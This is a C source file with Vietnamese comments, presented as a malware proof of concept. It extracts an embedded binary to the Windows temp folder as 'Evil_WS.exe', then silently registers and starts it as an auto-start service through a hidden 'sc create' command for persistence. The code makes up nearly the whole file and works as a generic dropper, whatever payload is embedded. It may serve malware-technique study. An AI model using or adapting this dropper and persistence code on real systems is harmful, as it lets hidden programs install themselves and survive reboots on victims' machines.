#include "resource.h"
#include <tchar.h>
#include <stdio.h>
#include <Windows.h>

/*
** Mô tả:
** - Chương trình chạy dưới dạng service có thể tự chạy lại sau khi máy tính reboot
** - Service là chương trình ko cần tương tác người dùng, nó chạy dạng nền/background.
** - Để cài đặt Service cách nhanh nhất là dùng Command Line, cách khác là dùng Windows API
** PoC:
** - Dropped tệp thực thi ra %TEMP%. Đây là một Windows Service
** - Windows service làm nhiệm vụ sau mỗi 5s sẽ query lấy status memory sau đó ghi ra file.
** - Tạo và chạy service đã dropped.
** Ref:
**  1. 5 bước tạo 1 ứng dụng Windows services bằng ngôn ngữ C
**	http://vncoding.net/2015/11/26/5-buoc-tao-1-ung-dung-windows-services-bang-ngon-ngu-c/
*/


int main()
{
	// *** Stage 1: Find and load resource ***
	HRSRC	hRes;			 // handle/ptr resource
	HGLOBAL	hResLoad;		 // handle to loaded resource
	LPVOID	lpResLock;		 // pointer to resource data

	// Locate the resource in file.
	printf(" [+] Finding resource.\n");
	Sleep(500);

	hRes = FindResourceA(
		NULL,		// locate resource current process
		101,		// name of resource (resource ID)
		"BIN");		// type of resource
	if (hRes == NULL) {
		printf(" [-] Could not locate resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Load the resource into global memory.
	hResLoad = LoadResource(
		NULL,	// current process
		hRes);	// handle to the resource
	if (hResLoad == NULL) {
		printf(" [-] Could not load resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Lock the resource into global memory.
	lpResLock = LockResource(hResLoad);
	if (lpResLock == NULL) {
		printf(" [-] Could not lock resource. Error Code = %d\n", GetLastError());
		return;
	}


	// *** Stage 2: Dropped/Extract/Write resource binary to file ***
	DWORD	dwSizeOfRes = 0;			// size (bytes) of the specified resource
	TCHAR	filePath[MAX_PATH];			// full path of file dropped
	TCHAR	lpTempPathBuffer[MAX_PATH];	// path of temp directory
	DWORD	dwRetVal = 0;				// temp variable

	printf(" [+] Dropping evil service file.\n");
	Sleep(500);

	// Calculating size of resource
	dwSizeOfRes = SizeofResource(
		NULL,	// current process
		hRes);	// handle/ptr resource

	// Get the temp path env
	dwRetVal = GetTempPath(MAX_PATH, lpTempPathBuffer);
	if (dwRetVal > MAX_PATH || (dwRetVal == 0)) {
		printf(" [-] Could not get temp path. Error Code = %d\n", GetLastError());
		return;
	}

	// Generates a temporary file name.
	wsprintfA(filePath, TEXT("%sEvil_WS.exe"), lpTempPathBuffer);

	HANDLE	hFileWriter;
	DWORD	dwBytesWritten = 0;
	BOOL	bErrorFlag = FALSE;

	// Create dropped file
	hFileWriter = CreateFile(
		filePath,				// name of the write
		GENERIC_WRITE,			// open for writing
		NULL,					// do not share
		NULL,					// default security
		CREATE_NEW,				// create new file only
		FILE_ATTRIBUTE_NORMAL,	// normal file
		NULL);					// no attr. template
	if (hFileWriter == INVALID_HANDLE_VALUE) {
		printf(" [-] Terminal failure: Unable to open file \"%s\" for write. Error Code = %d\n", filePath, GetLastError());
		return;
	}

	printf(" [+] Writing %d bytes to \"%s\".\n", dwSizeOfRes, filePath);
	Sleep(500);

	bErrorFlag = WriteFile(
		hFileWriter,		// open file handle
		lpResLock,			// start of data to write
		dwSizeOfRes,		// number of bytes to write
		&dwBytesWritten,	// number of bytes that were written
		NULL);				// no overlapped structure
	if (FALSE == bErrorFlag) {
		printf(" [-] Terminal failure: Unable to write to \"%s\". Error Code = %d\n", filePath, GetLastError());
	}
	else {
		if (dwBytesWritten != dwSizeOfRes) {
			printf(" [-] Error: dwBytesWritten != dwSizeOfRes. Error Code = %d\n", GetLastError());
		}
		else {
			printf(" [+] Wrote %d bytes to \"%s\" successfully.\n", dwBytesWritten, filePath);
		}
	}
	CloseHandle(hFileWriter);

	// *** Stage 3: Persistence via Windows Service ***
	printf(" [+] Setting up Persistence via Windows Service.\n");

#if 1 // Cách 1: Sử dụng Command Line để tạo Service
	LPCSTR		lpApplicationName = "C:\\Windows\\System32\\cmd.exe";
	LPSTR		lpCommandLine = "/C sc create \"Evil Windows Service\" binPath= %TEMP%\\Evil_WS.exe start= auto && sc start \"Evil Windows Service\"";

	HINSTANCE status = ShellExecute(NULL, "open", lpApplicationName, lpCommandLine, NULL, SW_HIDE);
	if ((DWORD)status <= 32) {
		printf(" [-] Failed to create and run windows service. Code = %d\n", GetLastError());
		return;
	}
#endif // Cách 1: Sử dụng Command Line để tạo Service

#if 0 // Cách 2: Sử dụng Windows API để tạo và run service

#endif // Cách 2: Sử dụng Windows API để tạo và run service


	Sleep(500);
	printf(" [+] Successfully. Goodbye!\n");

	return 0;
}